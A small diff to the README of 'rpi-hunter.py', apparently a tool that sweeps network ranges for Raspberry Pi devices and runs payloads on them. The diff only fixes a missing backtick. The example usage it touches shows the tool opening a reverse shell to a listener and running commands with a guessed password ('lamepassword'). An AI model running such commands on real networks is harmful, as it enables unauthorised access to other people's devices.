@@ -42,7 +42,7 @@ optional arguments:
 
 * Example usage: 
 	* `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337`
-	* `./rpi-hunter.py -r 192.168.2.0/16 -c lamepassword --payload "ls -lah"
+	* `./rpi-hunter.py -r 192.168.2.0/16 -c lamepassword --payload "ls -lah"`
 
 ## Disclaimer
 ## The standard internet fun disclaimer applies. Don't commit crimes, be responsible.
